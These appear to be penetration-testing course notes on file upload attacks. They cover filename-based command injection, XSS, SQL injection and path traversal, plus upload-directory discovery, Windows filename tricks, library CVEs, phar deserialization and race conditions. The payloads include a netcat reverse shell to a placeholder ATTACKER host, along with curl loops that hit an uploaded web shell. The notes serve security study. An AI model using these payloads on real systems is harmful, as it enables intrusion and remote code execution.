# Section 9 — Other Upload Attacks

> Theory only. No lab.

---

## Injection via Filename

When the server processes the uploaded filename through an OS command, SQL query, or HTML render, the filename itself becomes the injection vector.

### Command injection in filename
```
file$(whoami).jpg
file`whoami`.jpg
file;whoami;.jpg
file.jpg||whoami
file.jpg|nc ATTACKER 4444 -e /bin/bash
```
Triggers when the upload handler does something like:
```php
exec("mv /tmp/$tmpname /uploads/$filename");
```

### XSS in filename
```
<script>alert(document.cookie)</script>.jpg
"><img src=x onerror=alert(1)>.jpg
```
Triggers when the filename is displayed on a download list, search result, or admin moderation page.

### SQL injection in filename
```
file';SELECT+SLEEP(5);--.jpg
file" UNION SELECT 1,2,3-- -.jpg
```
Triggers when the filename is inserted into a database query without parameterization.

### Path traversal in filename
```
../../../etc/cron.d/x
../../../var/www/html/.htaccess
../../../var/www/html/index.php
```
Triggers when `move_uploaded_file($tmp, "/uploads/" . $name)` is naive — the traversal escapes the upload directory.

> Test these once you confirm upload succeeds. The defender's mistake is treating the filename as inert data — it's user input.

---

## Upload Directory Disclosure

When you upload a file but the URL/path isn't given back, find it via:

### Method 1 — Fuzz common upload dirs
```bash
for d in uploads upload files attachments avatars profile_images images media documents userfiles user-uploads; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "http://TARGET/$d/test.jpg")
  echo "/$d/ → $code"
done
```

### Method 2 — Force error messages
- Upload a file with the **same name** as an existing one
- Send two identical upload requests in parallel
- Upload a file with an **overly long filename** (5000+ chars)
- Upload an **empty file** or zero-byte file
- Upload a file with **invalid encoding** in the name

Verbose error messages often reveal:
- Full path to the upload directory
- PHP version / web server version
- Filesystem permissions errors

### Method 3 — Pull source via LFI / XXE
If you have any read primitive (covered in earlier modules):
```bash
# Read upload.php source
?file=php://filter/read=convert.base64-encode/resource=upload.php
```
The `$target_dir` variable in the source IS the answer.

### Method 4 — Inspect what already displays uploads
The page that shows your avatar / uploaded resource has the path in HTML:
```bash
curl -sk "http://TARGET/profile" | grep -oP '(src|href)="[^"]+"' | grep -iE 'upload|image|file'
```

---

## Windows-Specific Tricks

### Reserved characters
Windows treats these as special — using them in filenames can crash naive validators:
```
|  <  >  *  ?  "
```

### Reserved device names
Windows refuses to write files with these names — forces an error revealing the upload path:
```
CON  PRN  AUX  NUL
COM1 COM2 ... COM9
LPT1 LPT2 ... LPT9
```

Try `CON.jpg` or `NUL.png` — error message often leaks the writable directory.

### 8.3 Short Filename Convention
Windows preserves DOS 8.3 names for backwards compat. Useful for:

**Overwriting existing files:**
- File `web.config` exists
- Upload `WEB~1.CON` → may overwrite the original on some configs

**Bypassing extension-based filters:**
- Filter checks `.jpg` extension
- Upload `image~1.php` → 8.3 name may resolve differently

```
ORIGINAL.TXT  → ORIGI~1.TXT
LongFileName.txt → LONGFI~1.TXT
hackthebox.txt → HACKTH~1.TXT
```

> Largely historical at this point — modern Windows + IIS configs often disable 8.3 generation. Try when you're stuck.

---

## Advanced Library Exploits

Upload functionality often pipes files through automatic processing — image resizing, video transcoding, document conversion, archive extraction. Each library has its own CVE history.

### Common targets

| Library | Notable bugs |
|---------|-------------|
| **ImageMagick** | CVE-2016-3714 "ImageTragick" — RCE via crafted SVG/MVG |
| **GhostScript** | CVE-2018-16509, CVE-2023-36664 — sandbox escape via PostScript |
| **ExifTool** | CVE-2021-22204 — RCE via DjVu metadata |
| **ffmpeg** | XXE via crafted AVI files containing playlists |
| **libtiff** | Multiple memory corruption CVEs in TIFF parsing |
| **PHP `phar://`** | Phar deserialization (auto-triggers on file operations) |
| **Apache Commons FileUpload** | CVE-2023-24998 — multipart parser DoS |
| **Spring MVC multipart** | CVE-2023-20860, etc. |

### Identification
- Server response headers may reveal library versions
- Common upload-handling stacks: PHP+ImageMagick, Node+sharp, Java+Apache Commons
- Test with **known-trigger inputs** (e.g., the ImageTragick MVG payload — public PoC)

---

## Phar Deserialization Bonus

When ANY file operation runs against a `phar://` URL, PHP executes the phar's metadata — which can contain a serialized PHP object → object injection RCE.

```bash
# Build a malicious phar with a payload that triggers __destruct/__wakeup
php --define phar.readonly=0 build_phar.php

# Upload as image.jpg
curl -X POST "http://TARGET/upload" -F "file=@malicious.jpg"

# Later: ANY function that does file_exists/fopen/is_file on phar://uploads/image.jpg
# triggers deserialization → RCE
```

Triggers on functions you'd never expect: `file_exists()`, `fopen()`, `getimagesize()`, `imagecreatefromstring()`, even `unlink()`.

> Covered in the Web Attacks module in depth.

---

## Race Conditions

If validation runs **after** the file is written:

```
1. Upload shell.php
2. Server saves it temporarily as /uploads/shell.php
3. Server runs validation — sees .php — schedules deletion
4. Attacker races to access /uploads/shell.php BEFORE deletion completes
```

Solution: send the upload, then immediately curl the file in a tight loop:
```bash
while true; do curl -s "http://TARGET/uploads/shell.php?c=id" | grep uid && break; done
```

---

## Exam Notes

- Filename injections are the **most overlooked** upload bug class — defenders sanitize content but forget the name
- Always test traversal in the filename: `../../../etc/cron.d/x` is the single payload that turns "innocent upload" into "root via cron"
- Windows reserved names (`CON`, `NUL`) reliably surface verbose errors — useful for blind exploitation
- 8.3 short names are mostly historical; try only after the standard attacks fail on IIS
- Library CVEs are the wildcard — check **versions** on every engagement (Wappalyzer, headers, Nuclei)
- Phar deserialization is a covered exam topic but appears in the Web Attacks module
- Race conditions: rare in modern frameworks but appear in custom upload code that does "save then validate"
- Forcing errors via long filenames, duplicate uploads, or invalid encoding is a cheap path to directory disclosure
